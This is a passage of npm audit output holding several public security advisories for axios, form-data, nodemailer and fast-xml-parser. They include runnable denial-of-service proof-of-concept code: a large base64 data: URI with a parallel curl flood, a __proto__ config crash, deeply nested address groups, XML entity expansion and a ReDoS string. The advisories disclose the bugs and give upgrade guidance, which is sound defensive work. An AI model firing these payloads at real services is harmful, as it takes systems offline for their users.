[`[httpAdapter](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231):\n\n```js\nconst fullPath = buildFullPath(config.baseURL, config.url, config.allowAbsoluteUrls);\nconst parsed = new URL(fullPath, platform.hasBrowserEnv ? platform.origin : undefined);\nconst protocol = parsed.protocol || supportedProtocols[0];\n\nif (protocol === 'data:') {\n  let convertedData;\n  if (method !== 'GET') {\n    return settle(resolve, reject, { status: 405, ... });\n  }\n  convertedData = fromDataURI(config.url, responseType === 'blob', {\n    Blob: config.env && config.env.Blob\n  });\n  return settle(resolve, reject, { data: convertedData, status: 200, ... });\n}\n```\n\nThe decoder is in [`[lib/helpers/fromDataURI.js](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27):\n\n```js\nexport default function fromDataURI(uri, asBlob, options) {\n  ...\n  if (protocol === 'data') {\n    uri = protocol.length ? uri.slice(protocol.length + 1) : uri;\n    const match = DATA_URL_PATTERN.exec(uri);\n    ...\n    const body = match[3];\n    const buffer = Buffer.from(decodeURIComponent(body), isBase64 ? 'base64' : 'utf8');\n    if (asBlob) { return new _Blob([buffer], {type: mime}); }\n    return buffer;\n  }\n  throw new AxiosError('Unsupported protocol ' + protocol, ...);\n}\n```\n\n* The function decodes the entire Base64 payload into a Buffer with no size limits or sanity checks.\n* It does **not** honour `config.maxContentLength` or `config.maxBodyLength`, which only apply to HTTP streams.\n* As a result, a `data:` URI of arbitrary size can cause the Node process to allocate the entire content into memory.\n\nIn comparison, normal HTTP responses are monitored for size, the HTTP adapter accumulates the response into a buffer and will reject when `totalResponseBytes` exceeds [`[maxContentLength](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550). No such check occurs for `data:` URIs.\n\n\n## PoC\n\n```js\nconst axios = require('axios');\n\nasync function main() {\n  // this example decodes ~120 MB\n  const base64Size = 160_000_000; // 120 MB after decoding\n  const base64 = 'A'.repeat(base64Size);\n  const uri = 'data:application/octet-stream;base64,' + base64;\n\n  console.log('Generating URI with base64 length:', base64.length);\n  const response = await axios.get(uri, {\n    responseType: 'arraybuffer'\n  });\n\n  console.log('Received bytes:', response.data.length);\n}\n\nmain().catch(err => {\n  console.error('Error:', err.message);\n});\n```\n\nRun with limited heap to force a crash:\n\n```bash\nnode --max-old-space-size=100 poc.js\n```\n\nSince Node heap is capped at 100 MB, the process terminates with an out-of-memory error:\n\n```\n<--- Last few GCs --->\n…\nFATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory\n1: 0x… node::Abort() …\n…\n```\n\nMini Real App PoC:\nA small link-preview service that uses axios streaming, keep-alive agents, timeouts, and a JSON body. It allows data: URLs which axios fully ignore `maxContentLength `, `maxBodyLength` and decodes into memory on Node before streaming enabling DoS.\n\n```js\nimport express from \"express\";\nimport morgan from \"morgan\";\nimport axios from \"axios\";\nimport http from \"node:http\";\nimport https from \"node:https\";\nimport { PassThrough } from \"node:stream\";\n\nconst keepAlive = true;\nconst httpAgent = new http.Agent({ keepAlive, maxSockets: 100 });\nconst httpsAgent = new https.Agent({ keepAlive, maxSockets: 100 });\nconst axiosClient = axios.create({\n  timeout: 10000,\n  maxRedirects: 5,\n  httpAgent, httpsAgent,\n  headers: { \"User-Agent\": \"axios-poc-link-preview/0.1 (+node)\" },\n  validateStatus: c => c >= 200 && c < 400\n});\n\nconst app = express();\nconst PORT = Number(process.env.PORT || 8081);\nconst BODY_LIMIT = process.env.MAX_CLIENT_BODY || \"50mb\";\n\napp.use(express.json({ limit: BODY_LIMIT }));\napp.use(morgan(\"combined\"));\n\napp.get(\"/healthz\", (req,res)=>res.send(\"ok\"));\n\n/**\n * POST /preview { \"url\": \"<http|https|data URL>\" }\n * Uses axios streaming but if url is data:, axios fully decodes into memory first (DoS vector).\n */\n\napp.post(\"/preview\", async (req, res) => {\n  const url = req.body?.url;\n  if (!url) return res.status(400).json({ error: \"missing url\" });\n\n  let u;\n  try { u = new URL(String(url)); } catch { return res.status(400).json({ error: \"invalid url\" }); }\n\n  // Developer allows using data:// in the allowlist\n  const allowed = new Set([\"http:\", \"https:\", \"data:\"]);\n  if (!allowed.has(u.protocol)) return res.status(400).json({ error: \"unsupported scheme\" });\n\n  const controller = new AbortController();\n  const onClose = () => controller.abort();\n  res.on(\"close\", onClose);\n\n  const before = process.memoryUsage().heapUsed;\n\n  try {\n    const r = await axiosClient.get(u.toString(), {\n      responseType: \"stream\",\n      maxContentLength: 8 * 1024, // Axios will ignore this for data:\n      maxBodyLength: 8 * 1024,    // Axios will ignore this for data:\n      signal: controller.signal\n    });\n\n    // stream only the first 64KB back\n    const cap = 64 * 1024;\n    let sent = 0;\n    const limiter = new PassThrough();\n    r.data.on(\"data\", (chunk) => {\n      if (sent + chunk.length > cap) { limiter.end(); r.data.destroy(); }\n      else { sent += chunk.length; limiter.write(chunk); }\n    });\n    r.data.on(\"end\", () => limiter.end());\n    r.data.on(\"error\", (e) => limiter.destroy(e));\n\n    const after = process.memoryUsage().heapUsed;\n    res.set(\"x-heap-increase-mb\", ((after - before)/1024/1024).toFixed(2));\n    limiter.pipe(res);\n  } catch (err) {\n    const after = process.memoryUsage().heapUsed;\n    res.set(\"x-heap-increase-mb\", ((after - before)/1024/1024).toFixed(2));\n    res.status(502).json({ error: String(err?.message || err) });\n  } finally {\n    res.off(\"close\", onClose);\n  }\n});\n\napp.listen(PORT, () => {\n  console.log(`axios-poc-link-preview listening on http://0.0.0.0:${PORT}`);\n  console.log(`Heap cap via NODE_OPTIONS, JSON limit via MAX_CLIENT_BODY (default ${BODY_LIMIT}).`);\n});\n```\nRun this app and send 3 post requests:\n```sh\nSIZE_MB=35 node -e 'const n=+process.env.SIZE_MB*1024*1024; const b=Buffer.alloc(n,65).toString(\"base64\"); process.stdout.write(JSON.stringify({url:\"data:application/octet-stream;base64,\"+b}))' \\\n| tee payload.json >/dev/null\nseq 1 3 | xargs -P3 -I{} curl -sS -X POST \"$URL\" -H 'Content-Type: application/json' --data-binary @payload.json -o /dev/null```\n```\n\n---\n\n## Suggestions\n\n1. **Enforce size limits**\n   For `protocol === 'data:'`, inspect the length of the Base64 payload before decoding. If `config.maxContentLength` or `config.maxBodyLength` is set, reject URIs whose payload exceeds the limit.\n\n2. **Stream decoding**\n   Instead of decoding the entire payload in one `Buffer.from` call, decode the Base64 string in chunks using a streaming Base64 decoder. This would allow the application to process the data incrementally and abort if it grows too large.","reported_by":null,"title":"Axios is vulnerable to DoS attack through lack of data size check","metadata":null,"cves":["CVE-2025-58754"],"access":"public","severity":"high","module_name":"axios","vulnerable_versions":">=1.0.0 <1.12.0","github_advisory_id":"GHSA-4hjh-wcwx-xvwj","recommendation":"Upgrade to version 1.12.0 or later","patched_versions":">=1.12.0","updated":"2026-01-16T14:49:39.000Z","cvss":{"score":7.5,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"},"cwe":["CWE-770"],"url":"https://github.com/advisories/GHSA-4hjh-wcwx-xvwj"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1113275,"path":"node-pushnotifications>node-gcm>axios","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"1.6.8","paths":["node-pushnotifications>node-gcm>axios"]}],"found_by":null,"deleted":null,"references":"- https://github.com/axios/axios/security/advisories/GHSA-43fc-jf86-j433\n- https://github.com/axios/axios/pull/7369\n- https://github.com/axios/axios/commit/28c721588c7a77e7503d0a434e016f852c597b57\n- https://github.com/axios/axios/releases/tag/v1.13.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-25639\n- https://github.com/axios/axios/pull/7388\n- https://github.com/axios/axios/commit/d7ff1409c68168d3057fc3891f911b2b92616f9e\n- https://github.com/axios/axios/releases/tag/v0.30.3\n- https://github.com/advisories/GHSA-43fc-jf86-j433","created":"2026-02-09T17:46:14.000Z","id":1113275,"npm_advisory_id":null,"overview":"# Denial of Service via **proto** Key in mergeConfig\n\n### Summary\n\nThe `mergeConfig` function in axios crashes with a TypeError when processing configuration objects containing `__proto__` as an own property. An attacker can trigger this by providing a malicious configuration object created via `JSON.parse()`, causing complete denial of service.\n\n### Details\n\nThe vulnerability exists in `lib/core/mergeConfig.js` at lines 98-101:\n\n```javascript\nutils.forEach(Object.keys({ ...config1, ...config2 }), function computeConfigValue(prop) {\n  const merge = mergeMap[prop] || mergeDeepProperties;\n  const configValue = merge(config1[prop], config2[prop], prop);\n  (utils.isUndefined(configValue) && merge !== mergeDirectKeys) || (config[prop] = configValue);\n});\n```\n\nWhen `prop` is `'__proto__'`:\n\n1. `JSON.parse('{\"__proto__\": {...}}')` creates an object with `__proto__` as an own enumerable property\n2. `Object.keys()` includes `'__proto__'` in the iteration\n3. `mergeMap['__proto__']` performs prototype chain lookup, returning `Object.prototype` (truthy object)\n4. The expression `mergeMap[prop] || mergeDeepProperties` evaluates to `Object.prototype`\n5. `Object.prototype(...)` throws `TypeError: merge is not a function`\n\nThe `mergeConfig` function is called by:\n\n- `Axios._request()` at `lib/core/Axios.js:75`\n- `Axios.getUri()` at `lib/core/Axios.js:201`\n- All HTTP method shortcuts (`get`, `post`, etc.) at `lib/core/Axios.js:211,224`\n\n### PoC\n\n```javascript\nimport axios from \"axios\";\n\nconst maliciousConfig = JSON.parse('{\"__proto__\": {\"x\": 1}}');\nawait axios.get(\"https://httpbin.org/get\", maliciousConfig);\n```\n\n**Reproduction steps:**\n\n1. Clone axios repository or `npm install axios`\n2. Create file `poc.mjs` with the code above\n3. Run: `node poc.mjs`\n4. Observe the TypeError crash\n\n**Verified output (axios 1.13.4):**\n\n```\nTypeError: merge is not a function\n    at computeConfigValue (lib/core/mergeConfig.js:100:25)\n    at Object.forEach (lib/utils.js:280:10)\n    at mergeConfig (lib/core/mergeConfig.js:98:9)\n```\n\n**Control tests performed:**\n| Test | Config | Result |\n|------|--------|--------|\n| Normal config | `{\"timeout\": 5000}` | SUCCESS |\n| Malicious config | `JSON.parse('{\"__proto__\": {\"x\": 1}}')` | **CRASH** |\n| Nested object | `{\"headers\": {\"X-Test\": \"value\"}}` | SUCCESS |\n\n**Attack scenario:**\nAn application that accepts user input, parses it with `JSON.parse()`, and passes it to axios configuration will crash when receiving the payload `{\"__proto__\": {\"x\": 1}}`.\n\n### Impact\n\n**Denial of Service** - Any application using axios that processes user-controlled JSON and passes it to axios configuration methods is vulnerable. The application will crash when processing the malicious payload.\n\nAffected environments:\n\n- Node.js servers using axios for HTTP requests\n- Any backend that passes parsed JSON to axios configuration\n\nThis is NOT prototype pollution - the application crashes before any assignment occurs.","reported_by":null,"title":"Axios is Vulnerable to Denial of Service via __proto__ Key in mergeConfig","metadata":null,"cves":["CVE-2026-25639"],"access":"public","severity":"high","module_name":"axios","vulnerable_versions":">=1.0.0 <=1.13.4","github_advisory_id":"GHSA-43fc-jf86-j433","recommendation":"Upgrade to version 1.13.5 or later","patched_versions":">=1.13.5","updated":"2026-02-18T17:16:29.000Z","cvss":{"score":7.5,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"},"cwe":["CWE-754"],"url":"https://github.com/advisories/GHSA-43fc-jf86-j433"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1109538,"path":"form-data","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"4.0.2","paths":["form-data","node-pushnotifications>node-gcm>axios>form-data"]}],"found_by":null,"deleted":null,"references":"- https://github.com/form-data/form-data/security/advisories/GHSA-fjxv-7rqg-78g4\n- https://nvd.nist.gov/vuln/detail/CVE-2025-7783\n- https://github.com/form-data/form-data/commit/3d1723080e6577a66f17f163ecd345a21d8d0fd0\n- https://github.com/benweissmann/CVE-2025-7783-poc\n- https://lists.debian.org/debian-lts-announce/2025/07/msg00023.html\n- https://github.com/advisories/GHSA-fjxv-7rqg-78g4","created":"2025-07-21T19:04:54.000Z","id":1109538,"npm_advisory_id":null,"overview":"### Summary\n\nform-data uses `Math.random()` to select a boundary value for multipart form-encoded data. This can lead to a security issue if an attacker:\n1. can observe other values produced by Math.random in the target application, and\n2. can control one field of a request made using form-data\n\nBecause the values of Math.random() are pseudo-random and predictable (see: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f), an attacker who can observe a few sequential values can determine the state of the PRNG and predict future values, includes those used to generate form-data's boundary value. The allows the attacker to craft a value that contains a boundary value, allowing them to inject additional parameters into the request.\n\nThis is largely the same vulnerability as was [recently found in `undici`](https://hackerone.com/reports/2913312) by [`parrot409`](https://hackerone.com/parrot409?type=user) -- I'm not affiliated with that researcher but want to give credit where credit is due! My PoC is largely based on their work.\n\n### Details\n\nThe culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/lib/form_data.js#L347\n\nAn attacker who is able to predict the output of Math.random() can predict this boundary value, and craft a payload that contains the boundary value, followed by another, fully attacker-controlled field. This is roughly equivalent to any sort of improper escaping vulnerability, with the caveat that the attacker must find a way to observe other Math.random() values generated by the application to solve for the state of the PRNG. However, Math.random() is used in all sorts of places that might be visible to an attacker (including by form-data itself, if the attacker can arrange for the vulnerable application to make a request to an attacker-controlled server using form-data, such as a user-controlled webhook -- the attacker could observe the boundary values from those requests to observe the Math.random() outputs). A common example would be a `x-request-id` header added by the server. These sorts of headers are often used for distributed tracing, to correlate errors across the frontend and backend. `Math.random()` is a fine place to get these sorts of IDs (in fact, [opentelemetry uses Math.random for this purpose](https://github.com/open-telemetry/opentelemetry-js/blob/2053f0d3a44631ade77ea04f656056a2c8a2ae76/packages/opentelemetry-sdk-trace-base/src/platform/node/RandomIdGenerator.ts#L22))\n\n### PoC\n\nPoC here: https://github.com/benweissmann/CVE-2025-7783-poc\n\nInstructions are in that repo. It's based on the PoC from https://hackerone.com/reports/2913312 but simplified somewhat; the vulnerable application has a more direct side-channel from which to observe Math.random() values (a separate endpoint that happens to include a randomly-generated request ID). \n\n### Impact\n\nFor an application to be vulnerable, it must:\n- Use `form-data` to send data including user-controlled data to some other system. The attacker must be able to do something malicious by adding extra parameters (that were not intended to be user-controlled) to this request. Depending on the target system's handling of repeated parameters, the attacker might be able to overwrite values in addition to appending values (some multipart form handlers deal with repeats by overwriting values instead of representing them as an array)\n- Reveal values of Math.random(). It's easiest if the attacker can observe multiple sequential values, but more complex math could recover the PRNG state to some degree of confidence with non-sequential values. \n\nIf an application is vulnerable, this allows an attacker to make arbitrary requests to internal systems.","reported_by":null,"title":"form-data uses unsafe random function in form-data for choosing boundary","metadata":null,"cves":["CVE-2025-7783"],"access":"public","severity":"critical","module_name":"form-data","vulnerable_versions":">=4.0.0 <4.0.4","github_advisory_id":"GHSA-fjxv-7rqg-78g4","recommendation":"Upgrade to version 4.0.4 or later","patched_versions":">=4.0.4","updated":"2025-11-03T21:34:09.000Z","cvss":{"score":0,"vectorString":null},"cwe":["CWE-330"],"url":"https://github.com/advisories/GHSA-fjxv-7rqg-78g4"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1109804,"path":"nodemailer","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"6.9.10","paths":["nodemailer"]}],"found_by":null,"deleted":null,"references":"- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-mm7p-fcc7-pg87\n- https://github.com/nodemailer/nodemailer/commit/1150d99fba77280df2cfb1885c43df23109a8626\n- https://nvd.nist.gov/vuln/detail/CVE-2025-13033\n- https://access.redhat.com/security/cve/CVE-2025-13033\n- https://bugzilla.redhat.com/show_bug.cgi?id=2402179\n- https://github.com/advisories/GHSA-mm7p-fcc7-pg87","created":"2025-10-07T13:42:02.000Z","id":1109804,"npm_advisory_id":null,"overview":"The email parsing library incorrectly handles quoted local-parts containing @. This leads to misrouting of email recipients, where the parser extracts and routes to an unintended domain instead of the RFC-compliant target.\n\nPayload: `\"xclow3n@gmail.com x\"@internal.domain`\nUsing the following code to send mail\n```\nconst nodemailer = require(\"nodemailer\");\n\nlet transporter = nodemailer.createTransport({\n  service: \"gmail\",\n  auth: {\n    user: \"\",\n    pass: \"\",\n  },\n});\n\nlet mailOptions = {\n  from: '\"Test Sender\" <your_email@gmail.com>', \n  to: \"\\\"xclow3n@gmail.com x\\\"@internal.domain\",\n  subject: \"Hello from Nodemailer\",\n  text: \"This is a test email sent using Gmail SMTP and Nodemailer!\",\n};\n\ntransporter.sendMail(mailOptions, (error, info) => {\n  if (error) {\n    return console.log(\"Error: \", error);\n  }\n  console.log(\"Message sent: %s\", info.messageId);\n\n});\n\n\n(async () => {\n  const parser = await import(\"@sparser/email-address-parser\");\n  const { EmailAddress, ParsingOptions } = parser.default;\n  const parsed = EmailAddress.parse(mailOptions.to /*, new ParsingOptions(true) */);\n\n  if (!parsed) {\n    console.error(\"Invalid email address:\", mailOptions.to);\n    return;\n  }\n\n  console.log(\"Parsed email:\", {\n    address: `${parsed.localPart}@${parsed.domain}`,\n    local: parsed.localPart,\n    domain: parsed.domain,\n  });\n})();\n```\n\nRunning the script and seeing how this mail is parsed according to RFC\n\n```\nParsed email: {\n  address: '\"xclow3n@gmail.com x\"@internal.domain',\n  local: '\"xclow3n@gmail.com x\"',\n  domain: 'internal.domain'\n}\n```\n\nBut the email is sent to `xclow3n@gmail.com`\n\n<img width=\"2128\" height=\"439\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/20eb459c-9803-45a2-b30e-5d1177d60a8d\" />\n\n\n### Impact:\n\n-    Misdelivery / Data leakage: Email is sent to psres.net instead of test.com.\n\n-    Filter evasion: Logs and anti-spam systems may be bypassed by hiding recipients inside quoted local-parts.\n\n-    Potential compliance issue: Violates RFC 5321/5322 parsing rules.\n\n-    Domain based access control bypass in downstream applications using your library to send mails\n\n### Recommendations\n\n-    Fix parser to correctly treat quoted local-parts per RFC 5321/5322.\n\n-    Add strict validation rejecting local-parts containing embedded @ unless fully compliant with quoting.","reported_by":null,"title":"Nodemailer: Email to an unintended domain can occur due to Interpretation Conflict","metadata":null,"cves":["CVE-2025-13033"],"access":"public","severity":"moderate","module_name":"nodemailer","vulnerable_versions":"<7.0.7","github_advisory_id":"GHSA-mm7p-fcc7-pg87","recommendation":"Upgrade to version 7.0.7 or later","patched_versions":">=7.0.7","updated":"2025-11-17T17:29:27.000Z","cvss":{"score":0,"vectorString":null},"cwe":["CWE-20","CWE-436"],"url":"https://github.com/advisories/GHSA-mm7p-fcc7-pg87"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1113165,"path":"nodemailer","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"6.9.10","paths":["nodemailer"]}],"found_by":null,"deleted":null,"references":"- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v\n- https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150\n- https://nvd.nist.gov/vuln/detail/CVE-2025-14874\n- https://access.redhat.com/security/cve/CVE-2025-14874\n- https://bugzilla.redhat.com/show_bug.cgi?id=2418133\n- https://github.com/advisories/GHSA-rcmh-qjqh-p98v","created":"2025-12-01T20:44:25.000Z","id":1113165,"npm_advisory_id":null,"overview":"### Summary\nA DoS can occur that immediately halts the system due to the use of an unsafe function.\n\n### Details\nAccording to **RFC 5322**, nested group structures (a group inside another group) are not allowed. Therefore, in lib/addressparser/index.js, the email address parser performs flattening when nested groups appear, since such input is likely to be abnormal. (If the address is valid, it is added as-is.) In other words, the parser flattens all nested groups and inserts them into the final group list.\nHowever, the code implemented for this flattening process can be exploited by malicious input and triggers DoS\n\nRFC 5322 uses a colon (:) to define a group, and commas (,) are used to separate members within a group.\nAt the following location in lib/addressparser/index.js:\n\nhttps://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90\n\nthere is code that performs this flattening. The issue occurs when the email address parser attempts to process the following kind of malicious address header:\n\n```g0: g1: g2: g3: ... gN: victim@example.com;```\n\nBecause no recursion depth limit is enforced, the parser repeatedly invokes itself in the pattern\n`addressparser → _handleAddress → addressparser → ...`\nfor each nested group. As a result, when an attacker sends a header containing many colons, Nodemailer enters infinite recursion, eventually throwing Maximum call stack size exceeded and causing the process to terminate immediately. Due to the structure of this behavior, no authentication is required, and a single request is enough to shut down the service.\n\nThe problematic code section is as follows:\n```js\nif (isGroup) {\n    ...\n    if (data.group.length) {\n        let parsedGroup = addressparser(data.group.join(',')); // <- boom!\n        parsedGroup.forEach(member => {\n            if (member.group) {\n                groupMembers = groupMembers.concat(member.group);\n            } else {\n                groupMembers.push(member);\n            }\n        });\n    }\n}\n```\n`data.group` is expected to contain members separated by commas, but in the attacker’s payload the group contains colon `(:)` tokens. Because of this, the parser repeatedly triggers recursive calls for each colon, proportional to their number.\n\n### PoC\n\n```\nconst nodemailer = require('nodemailer');\n\nfunction buildDeepGroup(depth) {\n  let parts = [];\n  for (let i = 0; i < depth; i++) {\n    parts.push(`g${i}:`);\n  }\n  return parts.join(' ') + ' user@example.com;';\n}\n\nconst DEPTH = 3000; // <- control depth \nconst toHeader = buildDeepGroup(DEPTH);\nconsole.log('to header length:', toHeader.length);\n\nconst transporter = nodemailer.createTransport({\n  streamTransport: true,\n  buffer: true,\n  newline: 'unix'\n});\n\nconsole.log('parsing start');\n\ntransporter.sendMail(\n  {\n    from: 'test@example.com',\n    to: toHeader,\n    subject: 'test',\n    text: 'test'\n  },\n  (err, info) => {\n    if (err) {\n      console.error('error:', err);\n    } else {\n      console.log('finished :', info && info.envelope);\n    }\n  }\n);\n```\nAs a result, when the colon is repeated beyond a certain threshold, the Node.js process terminates immediately.\n\n### Impact\nThe attacker can achieve the following:\n\n1. Force an immediate crash of any server/service that uses Nodemailer\n2. Kill the backend process with a single web request\n3. In environments using PM2/Forever, trigger a continuous restart loop, causing severe resource exhaustion”","reported_by":null,"title":"Nodemailer’s addressparser is vulnerable to DoS caused by recursive calls","metadata":null,"cves":["CVE-2025-14874"],"access":"public","severity":"high","module_name":"nodemailer","vulnerable_versions":"<=7.0.10","github_advisory_id":"GHSA-rcmh-qjqh-p98v","recommendation":"Upgrade to version 7.0.11 or later","patched_versions":">=7.0.11","updated":"2026-02-12T22:09:03.000Z","cvss":{"score":7.5,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"},"cwe":["CWE-703"],"url":"https://github.com/advisories/GHSA-rcmh-qjqh-p98v"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1100054,"path":"node-pushnotifications>firebase-admin>@google-cloud/storage>fast-xml-parser","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"4.4.0","paths":["node-pushnotifications>firebase-admin>@google-cloud/storage>fast-xml-parser"]}],"found_by":null,"deleted":null,"references":"- https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-mpg4-rc92-vx8v\n- https://github.com/NaturalIntelligence/fast-xml-parser/commit/d0bfe8a3a2813a185f39591bbef222212d856164\n- https://github.com/NaturalIntelligence/fast-xml-parser/blob/master/src/v5/valueParsers/currency.js#L10\n- https://nvd.nist.gov/vuln/detail/CVE-2024-41818\n- https://github.com/NaturalIntelligence/fast-xml-parser/commit/ba5f35e7680468acd7906eaabb2f69e28ed8b2aa\n- https://github.com/advisories/GHSA-mpg4-rc92-vx8v","created":"2024-07-29T17:46:16.000Z","id":1100054,"npm_advisory_id":null,"overview":"### Summary\nA ReDOS that exists on currency.js was discovered by Gauss Security Labs R&D team.\n\n### Details\nhttps://github.com/NaturalIntelligence/fast-xml-parser/blob/v4.4.0/src/v5/valueParsers/currency.js#L10 contains a vulnerable regex \n\n### PoC\npass the following string '\\t'.repeat(13337)  + '.'\n\n### Impact\nDenial of service during currency parsing in experimental version 5 of fast-xml-parser-library\n\nhttps://gauss-security.com","reported_by":null,"title":"fast-xml-parser vulnerable to ReDOS at currency parsing","metadata":null,"cves":["CVE-2024-41818"],"access":"public","severity":"high","module_name":"fast-xml-parser","vulnerable_versions":">=4.3.5 <4.4.1","github_advisory_id":"GHSA-mpg4-rc92-vx8v","recommendation":"Upgrade to version 4.4.1 or later","patched_versions":">=4.4.1","updated":"2024-10-11T14:14:07.000Z","cvss":{"score":7.5,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"},"cwe":["CWE-400","CWE-1333"],"url":"https://github.com/advisories/GHSA-mpg4-rc92-vx8v"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1113331,"path":"node-pushnotifications>firebase-admin>@google-cloud/storage>fast-xml-parser","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"4.4.0","paths":["node-pushnotifications>firebase-admin>@google-cloud/storage>fast-xml-parser"]}],"found_by":null,"deleted":null,"references":"- https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-jmr7-xgp7-cmfj\n- https://github.com/NaturalIntelligence/fast-xml-parser/commit/910dae5be2de2955e968558fadf6e8f74f117a77\n- https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v5.3.6\n- https://nvd.nist.gov/vuln/detail/CVE-2026-26278\n- https://github.com/advisories/GHSA-jmr7-xgp7-cmfj","created":"2026-02-17T21:30:10.000Z","id":1113331,"npm_advisory_id":null,"overview":"### Summary\nThe XML parser can be forced to do an unlimited amount of entity expansion. With a very small XML input, it’s possible to make the parser spend seconds or even minutes processing a single request, effectively freezing the application.\n\n### Details\nThere is a check in `DocTypeReader.js` that tries to prevent entity expansion attacks by rejecting entities that reference other entities (it looks for & inside entity values). This does stop classic “Billion Laughs” payloads.\n\nHowever, it doesn’t stop a much simpler variant.\n\nIf you define one large entity that contains only raw text (no & characters) and then reference it many times, the parser will happily expand it every time. There is no limit on how large the expanded result can become, or how many replacements are allowed.\n\nThe problem is in `replaceEntitiesValue()` inside `OrderedObjParser.js`. It repeatedly runs `val.replace()` in a loop, without any checks on total output size or execution cost. As the entity grows or the number of references increases, parsing time explodes.\n\nRelevant code:\n\n`DocTypeReader.js` (lines 28–33): entity registration only checks for &\n\n`OrderedObjParser.js` (lines 439–458): entity replacement loop with no limits\n\n### PoC\n\n```js\nconst { XMLParser } = require('fast-xml-parser');\n\nconst entity = 'A'.repeat(1000);\nconst refs = '&big;'.repeat(100);\nconst xml = `<!DOCTYPE foo [<!ENTITY big \"${entity}\">]><root>${refs}</root>`;\n\nconsole.time('parse');\nnew XMLParser().parse(xml); // ~4–8 seconds for ~1.3 KB of XML\nconsole.timeEnd('parse');\n\n// 5,000 chars × 100 refs takes 200+ seconds\n// 50,000 chars × 1,000 refs will hang indefinitely\n```\n\n### Impact\nThis is a straightforward denial-of-service issue.\n\nAny service that parses user-supplied XML using the default configuration is vulnerable. Since Node.js runs on a single thread, the moment the parser starts expanding entities, the event loop is blocked. While this is happening, the server can’t handle any other requests.\n\nIn testing, a payload of only a few kilobytes was enough to make a simple HTTP server completely unresponsive for several minutes, with all other requests timing out.\n\n### Workaround\n\nAvoid using DOCTYPE parsing by `processEntities: false` option.","reported_by":null,"title":"fast-xml-parser affected by DoS through entity expansion in DOCTYPE (no expansion limit)","metadata":null,"cves":["CVE-2026-26278"],"access":"public","severity":"high","module_name":"fast-xml-parser","vulnerable_versions":">=4.1.3 <5.3.6","github_advisory_id":"GHSA-jmr7-xgp7-cmfj","recommendation":"Upgrade to version 5.3.6 or later","patched_versions":">=5.3.6","updated":"2026-02-19T21:56:58.000Z","cvss":{"score":7.5,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"},"cwe":["CWE-776"],"url":"https://github.com/advisories/GHSA-jmr7-xgp7-cmfj"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1113407,"path":"node-pushnotifications>firebase-admin>@google-cloud/storage>fast-xml-parser","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"4.4.0","paths":["node-pushnotifications>firebase-admin>@google-cloud/storage>fast-xml-parser"]}],"found_by":null,"deleted":null,"references":"- https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-m7jm-9gc2-mpf2\n- https://github.com/NaturalIntelligence/fast-xml-parser/commit/943ef0eb1b2d3284e72dd74f44a042ee9f07026e\n- https://github.com/NaturalIntelligence/fast-xml-parser/commit/ddcd0acf26ddd682cb0dc15a2bd6aa3b96bb1e69\n- https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v5.3.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-25896\n- https://github.com/advisories/GHSA-m7jm-9gc2-mpf2","created":"2026-02-20T18:23:54.000Z","id":1113407,"npm_advisory_id":null,"overview":"# Entity encoding bypass via regex injection in DOCTYPE entity names\n\n## Summary\n\nA dot (`.`) in a DOCTYPE entity name is treated as a regex wildcard during entity replacement, allowing an attacker to shadow built-in XML entities (`&lt;`, `&gt;`, `&amp;`, `&quot;`, `&apos;`) with arbitrary values. This bypasses entity encoding and leads to XSS when parsed output is rendered.\n\n## Details\n\nThe fix for CVE-2023-34104 addressed some regex metacharacters in entity names but missed `.` (period), which is valid in XML names per the W3C spec.\n\nIn `DocTypeReader.js`, entity names are passed directly to `RegExp()`:\n\n```js\nentities[entityName] = {\n    regx: RegExp(`&${entityName};`, \"g\"),\n    val: val\n};\n```\n\nAn entity named `l.` produces the 